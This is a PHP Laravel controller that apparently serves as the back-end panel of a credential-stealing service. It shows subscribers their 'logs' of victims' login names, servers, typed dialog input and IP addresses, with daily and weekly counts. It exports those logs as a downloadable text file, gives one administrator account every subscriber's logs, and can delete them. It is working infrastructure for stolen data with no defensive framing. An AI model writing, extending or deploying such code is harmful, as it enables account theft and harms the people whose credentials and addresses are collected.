<?php

namespace App\Http\Controllers;

use Illuminate\Support\Facades\Storage;
use App\User;
use Illuminate\Http\Request;
use Auth;
use DB;
use Carbon\Carbon;
use Response;
use File;

class StealerController extends Controller
{
    //
    public function index(Request $request){
        $id_base = Auth::id();
        $info_user = DB::table('users')->where('id',  $id_base)->first();
        if($info_user->stealer == 0) return redirect('/404');
        $news = DB::table('news')->orderBy('id', 'desc')->get();
	
        $logs = DB::table('logs')->orderBy('id', 'desc')->where('id_base',  $id_base)->get();


        $count_logs = 0;
        for($i = 0; $i < 7; $i++){
            $date_week = Carbon::now(+3)->subDay($i);
            $date_week = substr($date_week, 0, 10);
            $logs_week = DB::table('logs')->where('date', 'like', '%'. $date_week .'%')->where('id_base',  $id_base)->get()->count();
            $count_logs = $logs_week + $count_logs;
        }

        $date_today = Carbon::now(+3);
        $date_today  = substr($date_today, 0, 10);
        $logs_today = DB::table('logs')->where('date', 'like', '%'. $date_today .'%')->where('id_base',  $id_base)->get()->count();

        $date_yesterday = Carbon::now(+3)->subDay(1);;
        $date_yesterday  = substr($date_yesterday, 0, 10);
        $logs_yesterday = DB::table('logs')->where('date', 'like', '%'. $date_yesterday .'%')->where('id_base',  $id_base)->get()->count();


        return view('layouts.stealer', compact('logs','info_user','logs_today', 'count_logs', 'news','logs_yesterday'));
    }

    public function downloadLogs()
    {
	    set_time_limit(0);
        $id_base = Auth::id();
        $info_user = DB::table('users')->where('id',  $id_base)->first();
        if($info_user->stealer == 0) return redirect('/404');
	    if($id_base == 2)
       	{	
            $storages = DB::table('logs')->get();}else{
            $storages = DB::table('logs')->where('id_base',  $id_base)->get();
	    }
        $format = '';
        //$storages = DB::table('logs')->where('id_base', $user->id)->get();
        foreach($storages as $storage) {
            $format = sprintf("%s%s | Login: %s | Server: %s | Info[id: %s]: %s | User-IP: %s \n", $format, $storage->date, $storage->nick, $storage->server, $storage->dialog, $storage->input, $storage->ip_user);
            //$format = $storage->date . ' | Login: ' . $storage->nick . ' | Server: ' . $storage->server . ' | Info[id: ' . $storage->dialog . ']: '. $storage->input .' | User-IP: ' . $storage->ip_user . ' </br>' . $format;
        }
       Storage::disk('public')->put($id_base . '.txt', $format);

       // return redirect('/');
       return Response::download('storage/'.$id_base.'.txt')->deleteFileAfterSend();

        /*foreach ($logs as $log)
        {
           $logi =  $log->date . ' | Login: ' . $log->nick . ' | Server: ' . $log->server . ' | Info[id: ' . $log->dialog . ']: '. $log->input .' | User-IP: ' . $log->ip_user;  
        }*/
	    //echo $logi;
        //Response::download('/storage/app/' . $id_base.'.txt')->deleteFileAfterSend();
    }
    public function deleteLogs(){
        $id_base = Auth::id();
        $info_user = DB::table('users')->where('id',  $id_base)->first();
        if($info_user->stealer == 0) return redirect('/404');

        DB::table('logs')->where('id_base',  $id_base)->delete();


        return back();
    }

}

